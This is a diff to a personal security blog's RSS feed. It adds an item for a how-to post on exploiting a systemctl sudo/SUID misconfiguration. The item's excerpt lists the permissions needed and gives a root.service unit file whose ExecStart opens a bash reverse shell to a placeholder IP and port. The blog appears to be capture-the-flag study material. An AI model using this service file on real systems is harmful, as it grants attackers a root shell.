@@ -6,7 +6,20 @@
     <description>Recent content in Posts on Tanishq Chaudhary</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 28 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 03 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>How-to: systemctl misconfiguration exploit</title>
+      <link>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</link>
+      <pubDate>Sat, 03 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</guid>
+      <description>How-to: systemctl sudo/suid Exploit Explained 1. Requirements Case 0 You have the permissions to run /bin/systemctl as sudo or the SUID bit is set. This case is the easiest to deal with.
+Case 1 Permissions (at least):
+ /bin/systemctl daemon-reload /bin/systemctl restart *.service  Case 2 Permissions (at least):
+ /bin/systemctl daemon-reload /bin/systemctl enable *.service -&amp;gt; /bin/systemctl start *.service  2. Code Case 0 and Case 1 root.service
+[Unit] Description=pwn [Service] Type=simple User=root ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/your_ip/your_port 0&amp;gt;&amp;amp;1&#39; Case 0 and Case 2 root.</description>
+    </item>
+    
     <item>
       <title>TryHackMe: Anonforce Writeup</title>
       <link>https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/</link>
